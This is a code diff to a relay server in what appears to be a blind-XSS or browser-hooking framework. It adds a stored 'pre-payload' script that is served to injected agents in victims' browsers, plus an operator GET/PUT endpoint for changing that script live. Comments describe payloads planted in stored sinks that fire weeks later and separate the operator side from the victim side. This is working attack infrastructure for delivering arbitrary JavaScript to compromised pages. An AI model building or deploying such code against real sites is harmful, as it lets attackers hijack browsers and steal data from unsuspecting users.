@@ -8,10 +8,23 @@
  *   ws://localhost:7331/ws/console    console UIs
  */
 import http from 'node:http';
+import fs from 'node:fs/promises';
 import path from 'node:path';
 import { fileURLToPath } from 'node:url';
 import { WebSocketServer, type WebSocket } from 'ws';
-import { ASSET_MAX_BYTES, PING_TOKENS_FILE, WS_PATH, assetPath, decodeAssetUrl, isValidPingToken, isValidSessionId, rewriteCssUrls } from '@bxconsole/protocol';
+import {
+  ASSET_MAX_BYTES,
+  PING_TOKENS_FILE,
+  PRE_PAYLOAD_FILE,
+  PRE_PAYLOAD_MAX_BYTES,
+  SESSIONS_DIR,
+  WS_PATH,
+  assetPath,
+  decodeAssetUrl,
+  isValidPingToken,
+  isValidSessionId,
+  rewriteCssUrls,
+} from '@bxconsole/protocol';
 import { SessionRegistry } from './registry';
 import { SessionStore } from './store';
 import { Relay } from './relay';
@@ -244,9 +257,59 @@ function servePing(req: http.IncomingMessage, res: http.ServerResponse, requeste
   return true;
 }
 
+/*
+ * The pre-payload: one script, stored on disk, handed to agents whose payload
+ * asked for it with `pre=1`.
+ *
+ * On disk rather than in memory so it survives a restart — a payload planted
+ * in a stored sink may not fire for weeks, and the relay will have been
+ * restarted by then. Read on each request rather than cached, so editing it
+ * in the console takes effect for the next agent without a restart.
+ */
+const prePayloadPath = path.join(repoRoot, SESSIONS_DIR, PRE_PAYLOAD_FILE);
+
+async function readPrePayload(): Promise<string | null> {
+  try {
+    return await fs.readFile(prePayloadPath, 'utf8');
+  } catch {
+    return null; // never written, or removed
+  }
+}
+
 const serveAgent = createAgentHandler(path.join(repoRoot, 'packages/agent/dist/agent.js'), {
   publicOrigin: process.env.PUBLIC_ORIGIN,
+  prePayload: readPrePayload,
 });
+
+/**
+ * Read and write the stored pre-payload. Operator surface, not the victim's:
+ * a GET returns what is stored, a PUT replaces it, and an empty PUT body
+ * removes it so no agent receives one.
+ */
+async function servePrePayload(req: http.IncomingMessage, res: http.ServerResponse): Promise<void> {
+  if (req.method === 'GET') {
+    const source = await readPrePayload();
+    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8', 'Cache-Control': 'no-store' });
+    return void res.end(JSON.stringify({ source: source ?? '' }));
+  }
+  if (req.method !== 'PUT') return void plain(res, 405, 'GET or PUT');
+
+  const chunks: Buffer[] = [];
+  let size = 0;
+  for await (const chunk of req) {
+    size += (chunk as Buffer).length;
+    // It travels inline with every agent.js request that asks for it, so a
+    // runaway script would be paid for on every single install.
+    if (size > PRE_PAYLOAD_MAX_BYTES) return void plain(res, 413, `pre-payload is limited to ${PRE_PAYLOAD_MAX_BYTES} bytes`);
+    chunks.push(chunk as Buffer);
+  }
+  const source = Buffer.concat(chunks).toString('utf8');
+  await fs.mkdir(path.dirname(prePayloadPath), { recursive: true });
+  if (source.trim()) await fs.writeFile(prePayloadPath, source);
+  else await fs.rm(prePayloadPath, { force: true });
+  res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
+  res.end(JSON.stringify({ ok: true, bytes: source.trim() ? Buffer.byteLength(source) : 0 }));
+}
 
 const serveStatic = createStaticHandler({
   '/agent.js.map': path.join(repoRoot, 'packages/agent/dist/agent.js.map'),
@@ -282,6 +345,9 @@ const server = http.createServer((req, res) => {
   const requested = new URL(req.url ?? '/', 'http://localhost');
   const { pathname } = requested;
   if (pathname === '/agent.js') return void serveAgent(req, res);
+  if (pathname === '/pre-payload') {
+    return void servePrePayload(req, res).catch(() => plain(res, 500, 'pre-payload error'));
+  }
   if (pathname === '/ping' || pathname.startsWith('/ping/')) {
     if (servePing(req, res, requested)) return;
   }
